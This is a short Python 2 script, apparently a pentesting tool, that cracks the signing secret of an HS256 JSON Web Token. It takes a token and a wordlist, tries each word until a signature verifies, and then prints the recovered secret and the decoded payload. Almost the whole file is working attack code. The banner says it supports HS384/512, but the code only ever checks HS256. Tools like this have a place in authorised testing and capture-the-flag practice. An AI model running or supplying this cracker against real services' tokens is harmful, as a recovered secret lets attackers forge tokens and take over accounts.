# JWT Secret Cracker
#
# Shamelessly copied from:
# https://www.notsosecure.com/crafting-way-json-web-tokens/
#
# Getting started:
# 	pip install pyjwt
# 	pip install cryptography
#
# Ensure you set the algorithm to the corresponding token algorithm......
# Don't try and crack RS256 with HS256....
#
# The algorithm can be determined by base64 decoding the header:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# {"alg":"HS256","typ":"JWT"}
#
# Payload in JWT format: 
#	[header].[payload].[signature]
# 	e.g. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"

import jwt

print "\n\t   ___  _    _ _____   _____                _"             
print "\t  |_  || |  | |_   _| /  __ \              | |            "
print "\t    | || |  | | | |   | /  \/_ __ __ _  ___| | _____ _ __ "
print "\t    | || |/\| | | |   | |   | '__/ _` |/ __| |/ / _ \ '__|"
print "\t/\__/ /\  /\  / | |   | \__/\ | | (_| | (__|   <  __/ |   "
print "\t\____/  \/  \/  \_/    \____/_|  \__,_|\___|_|\_\___|_|  "
print "\tCurrently only supports HS256/384/512 not RS*, because RSA\n"
encoded = raw_input("Enter encoded payload:")
wordlist = raw_input("Path to wordlist:").rstrip()

with file(wordlist) as secrets:
	for secret in secrets:
		try:
			payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
			print "!! WINNER WINNER CHICKEN DINNER !!"
			print "** " + secret.rstrip() + " **"
			print payload 
			break
		except jwt.InvalidTokenError:
			print "Invalid Token - " + secret.rstrip()
		except jwt.DecodeError:
			print "Decoding Error - " + secret.rstrip()
		else:
			print "Uncaught Exception - " + secret.rstrip()
